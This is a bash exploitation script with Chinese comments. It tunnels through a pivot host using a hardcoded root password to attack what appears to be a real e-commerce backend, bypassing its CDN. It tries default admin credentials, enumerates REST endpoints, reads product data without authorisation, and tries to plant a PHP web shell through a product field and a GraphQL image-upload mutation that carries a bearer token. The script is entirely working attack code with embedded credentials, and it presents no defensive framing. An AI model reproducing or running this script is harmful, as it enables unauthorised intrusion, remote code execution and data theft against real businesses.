#!/bin/bash
# 绕过CDN直连后端利用脚本

PIVOT_HOST="82.29.71.156"
PIVOT_PORT="2233"
PIVOT_USER="root"
PIVOT_PASS="@admin1314@"
TARGET_IP="172.104.189.60"

echo "[+] 通过Pivot攻击真实后端"

# 测试1: 尝试创建admin token
echo "[测试1] 尝试获取admin token"
sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no -p $PIVOT_PORT $PIVOT_USER@$PIVOT_HOST \
  "curl -sk http://$TARGET_IP/rest/V1/integration/admin/token -H 'Host: oms.9to9.co.id' -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin123\"}' 2>&1" | head -10

# 测试2: 枚举所有REST端点
echo -e "\n[测试2] REST API端点扫描"
for endpoint in "products" "customers" "categories" "orders" "carts" "search" "cms/page" "cms/block"; do
    echo -n "  /rest/V1/$endpoint -> "
    sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no -p $PIVOT_PORT $PIVOT_USER@$PIVOT_HOST \
      "curl -sk http://$TARGET_IP/rest/V1/$endpoint -H 'Host: oms.9to9.co.id' -o /dev/null -w '%{http_code}' 2>&1"
    echo ""
done

# 测试3: 尝试未授权数据读取
echo -e "\n[测试3] 未授权数据枚举"
sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no -p $PIVOT_PORT $PIVOT_USER@$PIVOT_HOST \
  "curl -sk 'http://$TARGET_IP/rest/V1/products?searchCriteria[pageSize]=100' -H 'Host: oms.9to9.co.id' 2>&1 | head -100"

# 测试4: 尝试文件写入(通过API)
echo -e "\n[测试4] 尝试文件上传API"
sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no -p $PIVOT_PORT $PIVOT_USER@$PIVOT_HOST \
  "curl -sk http://$TARGET_IP/rest/V1/products -H 'Host: oms.9to9.co.id' -H 'Content-Type: application/json' -X POST -d '{\"product\":{\"sku\":\"shell\",\"name\":\"<?php system(\$_GET[c]); ?>\",\"price\":1}}' 2>&1" | head -20

# 测试5: GraphQL mutation直连
echo -e "\n[测试5] GraphQL直连后端上传"
TOKEN="lu428yeg56c6r5ax1v3h522kuwict1kg"
SHELL_B64=$(echo -n '<?php system($_GET["c"]); ?>' | base64)
sshpass -p "$PIVOT_PASS" ssh -o StrictHostKeyChecking=no -p $PIVOT_PORT $PIVOT_USER@$PIVOT_HOST \
  "curl -sk http://$TARGET_IP/graphql -H 'Host: oms.9to9.co.id' -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"query\":\"mutation { vendorProductImageUpload(binary: \\\"$SHELL_B64\\\") { status_cpi message_cpi } }\"}' 2>&1"

